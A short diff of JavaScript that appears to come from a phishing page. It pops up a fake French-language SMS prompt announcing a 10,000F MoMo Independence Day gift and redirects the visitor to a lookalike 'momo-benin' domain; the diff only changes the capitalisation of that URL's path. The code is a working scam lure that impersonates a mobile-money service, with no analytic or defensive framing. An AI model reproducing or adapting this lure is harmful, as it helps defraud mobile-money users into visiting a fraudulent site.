@@ -2,5 +2,5 @@
 var password = '10.000F'
 password=prompt('SMS: Félicitations, votre compte MoMo est qualifié pour recevoir le cadeau MoMo de 10 000F pour le Jour de lIndépendance. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
 if (password != '10.000F') {
-location.href='https://momo-benin.4g-data.pro/offre';
+location.href='https://momo-benin.4g-data.pro/Offre';
 }
